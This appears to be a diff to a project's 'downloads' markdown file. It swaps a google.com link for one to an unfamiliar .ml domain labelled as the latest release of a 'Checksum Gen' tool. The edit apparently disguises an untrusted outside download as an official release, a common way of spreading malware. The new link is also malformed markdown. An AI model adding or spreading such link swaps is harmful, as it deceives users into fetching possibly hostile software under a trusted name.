@@ -1,3 +1,3 @@
 # downloads
 
-(https://www.google.com "#1 - Checksum Gen - Latest Release")
+[https://download.piuroprauxy.ml/checksumdownload]("#1 - Checksum Gen - Latest Release")
